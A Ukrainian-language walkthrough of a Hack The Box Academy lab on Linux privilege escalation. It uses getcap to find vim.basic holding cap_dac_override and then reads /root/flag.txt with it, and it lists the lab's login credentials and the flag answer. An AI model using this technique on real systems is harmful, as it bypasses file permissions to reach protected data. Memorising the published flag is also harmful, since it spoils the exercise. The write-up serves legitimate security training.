## Capabilities

Ціль: `10.129.205.111`  

Питання:
- Escalate the privileges using capabilities and read the `flag.txt` файл у `/root`. Submit його вміст як відповідь.

Відповідь:
- `HTB{c4paBili7i3s_pR1v35c}`

***

## Крок 1 — Логін на ціль

```bash
ssh htb-student@10.129.205.111
# Password: HTB_@cademy_stdnt!
```

Після входу ти на Ubuntu 20.04 як користувач `htb-student`.

***

## Крок 2 — Знайти бінарники з capability

### Команда:

```bash
getcap -r / 2>/dev/null
```

Розбір:

- `getcap` – показує **Linux capabilities**, призначені для файлів (executable).
- `-r /` – рекурсивно по всій файловій системі від кореня `/`.
- `2>/dev/null` – відкидає помилки (Permission denied), щоб не заспамити вивід.

Фрагмент результату:

```text
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_dac_override+eip
...
```

Нас цікавить:

```text
/usr/bin/vim.basic = cap_dac_override+eip
```

***

## Крок 3 — Що означає `cap_dac_override+eip`

- `cap_dac_override` – capability, який дозволяє процесу **обходити DAC-перевірки** (Discretionary Access Control):
  - фактично «ігнорує» стандартні перевірки прав читання/запису до файлів.
  - якщо бінарник має цю capability, він може відкривати файли навіть без нормальних `r`/`w` прав для користувача.
- `+eip`:
  - `e` – **effective**: capability реально активна при виконанні бінарника;
  - `i` – **inheritable**: може передаватися дочірнім процесам;
  - `p` – **permitted**: дозволена для цього executable.

Отже, `vim.basic` запускається з правами, які дозволяють читати файли, до яких `htb-student` зазвичай не має доступу (наприклад, `/root/flag.txt`).

***

## Крок 4 — Прочитати /root/flag.txt через vim.basic

Звичайний `cat /root/flag.txt` від звичайного юзера не працював би (немає прав root). Але `vim.basic` з `cap_dac_override` може відкрити файл напряму:

```bash
/usr/bin/vim.basic /root/flag.txt
```

Що робить:

- `/usr/bin/vim.basic` – запускає базовий vim-бінарник.
- `/root/flag.txt` – файл у директорії root, до якого звичайний користувач не має доступу.
- Завдяки capability `cap_dac_override` vim може обійти стандартну перевірку прав і відкрити файл на читання.

У результаті в редакторі ти бачиш:

```text
HTB{c4paBili7i3s_pR1v35c}
```

Це флаг, який треба здати.

***

## Конспект команд для Capabilities

1. Логін:

   ```bash
   ssh htb-student@10.129.205.111
   # Password: HTB_@cademy_stdnt!
   ```

2. Знайти всі файли з capabilities:

   ```bash
   getcap -r / 2>/dev/null
   ```

3. Знайти цікаві capabilities (особливо `cap_dac_*`, `cap_sys_admin`, `cap_setuid` тощо). Тут:

   ```text
   /usr/bin/vim.basic = cap_dac_override+eip
   ```

4. Використати бінарник з capability для доступу до /root:

   ```bash
   /usr/bin/vim.basic /root/flag.txt
   # всередині vim бачиш: HTB{c4paBili7i3s_pR1v35c}
   ```

5. Відповідь:

   ```text
   HTB{c4paBili7i3s_pR1v35c}
   ```
